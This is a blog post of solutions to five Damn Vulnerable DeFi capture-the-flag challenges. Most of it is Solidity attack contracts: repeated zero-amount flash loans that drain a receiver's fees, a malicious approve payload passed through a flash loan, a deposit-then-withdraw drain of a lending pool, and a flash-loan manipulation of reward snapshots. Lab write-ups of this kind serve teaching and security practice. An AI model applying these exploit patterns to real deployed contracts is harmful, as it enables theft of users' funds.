---
title: Damn vulnerable defi Challenges
date: 2023-03-25 19:02:31
tags:
  - solidity
  - damnvulnerabledefi
  - defi
  - CTFs
categories:
  - solidity
---

## how to get it started

1. git clone [github repo](https://github.com/tinchoabbate/damn-vulnerable-defi/tree/v3.0.0)
2. yarn install
3. fill your code in \*.challenge.js
4. run your script via hardhat tools

## Challenge1

```javascript
it("Execution", async function () {
  /** CODE YOUR SOLUTION HERE */
  await token
    .connect(player)
    .approve(vault.address, INITIAL_PLAYER_TOKEN_BALANCE);
  await token
    .connect(player)
    .transfer(vault.address, INITIAL_PLAYER_TOKEN_BALANCE);
});
```

## Challenge2

```javascript
interface INaiveReceiverLenderPool{
    function fixedFee(address token, uint256) external pure returns (uint256);
    function flashLoan(address receiver,address token, uint256 amount,bytes calldata data) external returns (bool);
}

contract AttackContract {
    address private constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    function attack(INaiveReceiverLenderPool pool,address payable receiver) external {
        for(uint i=0;i<10;i++){
            pool.flashLoan(receiver, ETH,0,"0x");
        }
    }
}
```

## Challenge3

Use ERC20 approve function and not it will not affect the balance when making flashloan.

```javascript
function attack(TrusterLenderPool pool,DamnValuableToken _token) external {
    bytes memory data = abi.encodeWithSignature("approve(address,uint256)",address(this),type(uint256).max);
    pool.flashLoan(0,address(this),address(_token),data);
    _token.transferFrom(address(pool),msg.sender,_token.balanceOf(address(pool)));
}
```

## Challenge4

Use our deployed contract to send back the token using deposit function.After the flashloan call withdraw function to take our tokens back.
Do not forget to set the receive function for receiving tokens.
Use \_to.call function to send tokens,it is the current recommended method to use.

```javascript
contract Attack {
     function execute() external payable {
        SideEntranceLenderPool(msg.sender).deposit{value:msg.value}();
     }

     function attack(SideEntranceLenderPool pool,address payable player) external {
        //make a flashloan
        pool.flashLoan(1000 ether);
        //get the money
        pool.withdraw();
        //send to palyer
        (bool sent,) = player.call{value:1000 ether}("");
        require(sent, "Failed to send Ether");
     }

     receive() external payable {}
}
```

## Challenge5

The reward pool only count the amount of deposit. We can use flash loan to borrow some DVT token and claim the reward token at the same time.Here goes the code:

```javascript
contract TheRewardAttack {
    //flashloan pool address.
    FlashLoanerPool  private immutable pool;
    DamnValuableToken private immutable DVTtoken;
    TheRewarderPool private immutable RewardPool;
    RewardToken private immutable RdToken;
    address private owner;

    constructor(FlashLoanerPool _pool,DamnValuableToken _token,TheRewarderPool _RewardPool,RewardToken _Rdtoken,address player) {
        pool = _pool;
        DVTtoken = _token;
        RewardPool = _RewardPool;
        RdToken = _Rdtoken;
        owner = player;
    }

    function receiveFlashLoan(uint256 amount) external{
        //do something.
        //deposit to reward pool
        //approve amount to the reward pool
        DVTtoken.approve(address(RewardPool),amount);

        RewardPool.deposit(amount);

        //claim the rewards
        RewardPool.distributeRewards();

        //withdraw DVTtokens
        RewardPool.withdraw(amount);

        //return back DVT token.
        DVTtoken.transfer(address(pool),amount);

        //send reward token to our player.
        RdToken.transfer(owner,RdToken.balanceOf(address(this)));
    }

    function attack(uint256 amount) external{
        pool.flashLoan(amount);
    }
}
```
